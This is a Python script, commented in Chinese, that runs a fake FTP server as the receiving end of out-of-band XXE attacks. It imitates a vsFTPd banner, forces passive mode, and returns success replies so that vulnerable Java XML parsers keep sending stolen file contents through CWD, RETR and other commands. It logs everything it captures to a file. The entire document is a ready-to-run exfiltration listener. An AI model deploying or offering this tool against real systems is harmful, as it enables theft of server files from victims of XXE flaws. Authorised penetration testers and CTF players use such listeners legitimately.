import socket
import threading
import sys
import time

# === 配置部分 ===
BANNER = b'220 (vsFTPd 3.0.3)\r\n'
TIMEOUT = 10  # 连接超时时间

def get_host_ip():
    """ 获取本机局域网/公网 IP，用于构造 PASV 响应 """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def pasv_connection_handler(pasv_socket):
    """
    后台线程：处理 PASV 数据连接。
    主要目的是完成 TCP 握手，防止客户端报错，
    实际上 XXE 攻击的数据通常夹带在控制信道的命令中，而非数据信道。
    """
    try:
        pasv_socket.settimeout(5.0)
        conn_data, addr = pasv_socket.accept()
        # print(f"[*] [DEBUG] Data connection received from {addr}")
        conn_data.close()
    except Exception:
        pass
    finally:
        pasv_socket.close()

def handle_client(conn, addr, output_file=None):
    """ 处理主控制信道连接 """
    print(f"[*] New Connection from {addr[0]}:{addr[1]}")
    captured_data = []
    
    try:
        conn.send(BANNER)
        conn.settimeout(TIMEOUT)

        while True:
            try:
                raw_data = conn.recv(4096)
                if not raw_data: break
                msg_block = raw_data.decode('utf-8', errors='ignore')
            except socket.timeout:
                print(f"[!] Timeout from {addr} (Transfer likely finished)")
                break
            except Exception as e:
                print(f"[-] Socket error: {e}")
                break

            # 处理可能粘包的多行数据
            lines = msg_block.split('\n')
            for line in lines:
                line = line.strip()
                if not line: continue
                
                cmd_upper = line.upper()

                # === 1. 标准 FTP 协议握手 ===
                if cmd_upper.startswith('USER'):
                    conn.send(b'331 Please specify the password.\r\n')
                elif cmd_upper.startswith('PASS'):
                    conn.send(b'230 Login successful.\r\n')
                elif cmd_upper.startswith('SYST'):
                    conn.send(b'215 UNIX Type: L8\r\n')
                elif cmd_upper.startswith('FEAT'):
                    conn.send(b'211-Features:\r\n PASV\r\n211 End\r\n')
                elif cmd_upper.startswith('PWD'):
                    conn.send(b'257 "/home/user" is the current directory.\r\n')
                elif cmd_upper.startswith('TYPE'):
                    conn.send(b'200 Switching to Binary mode.\r\n')
                elif cmd_upper.startswith('OPTS'):
                    conn.send(b'200 OPTS command successful.\r\n')
                
                # === 2. 关键：拒绝 EPSV，强制使用 PASV ===
                elif cmd_upper.startswith('EPSV'):
                     conn.send(b'502 Command not implemented.\r\n') 

                # === 3. PASV 模式处理 (线程安全版) ===
                elif cmd_upper.startswith('PASV'):
                    try:
                        # 绑定随机端口
                        s_pasv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s_pasv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s_pasv.bind((IP, 0))
                        s_pasv.listen(1)
                        
                        _, port = s_pasv.getsockname()
                        
                        # 启动后台线程等待数据连接，不阻塞主循环
                        t = threading.Thread(target=pasv_connection_handler, args=(s_pasv,))
                        t.daemon = True
                        t.start()
                        
                        # 计算并发送 227 响应
                        ip_parts = IP.split('.')
                        p1, p2 = port // 256, port % 256
                        msg = f'227 Entering Passive Mode ({",".join(ip_parts)},{p1},{p2}).\r\n'
                        conn.send(msg.encode())
                    except Exception as e:
                        print(f"[-] PASV Setup Error: {e}")
                        conn.send(b'425 Can\'t open data connection.\r\n')

                # === 4. XXE 数据捕获区 ===
                elif cmd_upper.startswith('CWD'):
                    data = line[4:].strip()
                    captured_data.append(data)
                    print(f"[+] CWD Data: {data}")
                    conn.send(b'250 Directory successfully changed.\r\n')

                elif cmd_upper.startswith('RETR'):
                    data = line[5:].strip()
                    captured_data.append(data)
                    print(f"[+] RETR Data: {data}")
                    # 假装开启传输，配合 PASV 完成流程
                    conn.send(b'150 Opening BINARY mode data connection.\r\n')
                    conn.send(b'226 Transfer complete.\r\n')

                elif cmd_upper.startswith('QUIT'):
                    conn.send(b'221 Goodbye.\r\n')
                    return

                # === 5. Catch-All (处理多行文件内容) ===
                else:
                    # 任何不认识的命令都视为文件内容的一行
                    # Java FTP 客户端会将文件中的换行符视为命令结束，发送下一行作为新命令
                    # 我们必须返回 200 欺骗客户端继续发送
                    captured_data.append(line)
                    conn.send(b'200 Command okay.\r\n')

    except Exception as e:
        print(f"[-] Connection Error: {e}")
    finally:
        conn.close()
        print(f"[*] Connection closed: {addr}")
        
        # === 写入日志 ===
        if output_file and captured_data:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            header = f"\n{'='*20} Captured from {addr[0]} at {timestamp} {'='*20}\n"
            content = "\n".join(captured_data)
            footer = f"\n{'='*60}\n"
            
            try:
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(header + content + footer)
                print(f"[*] Data saved to {output_file}")
                # 预览前5行
                print("--- Preview ---")
                print("\n".join(captured_data[:5]))
                if len(captured_data) > 5: print("...")
            except Exception as e:
                print(f"[-] Write file error: {e}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <port> [output_file]")
        print(f"Example: python {sys.argv[0]} 2121 data.log")
        sys.exit(1)

    IP = get_host_ip()
    PORT = int(sys.argv[1])
    ADDR_MAIN = (IP, PORT)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(ADDR_MAIN)
        server.listen(10)
        print(f"[*] XXE Fake FTP Server listening on {IP}:{PORT}")
        if len(sys.argv) > 2:
            print(f"[*] Logging captured data to: {sys.argv[2]}")

        while True:
            conn, addr = server.accept()
            client_thread = threading.Thread(
                target=handle_client,
                args=(conn, addr, sys.argv[2] if len(sys.argv) > 2 else None)
            )
            client_thread.daemon = True
            client_thread.start()
            
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
    except Exception as e:
        print(f"\n[!] Critical Error: {e}")
    finally:
        server.close()
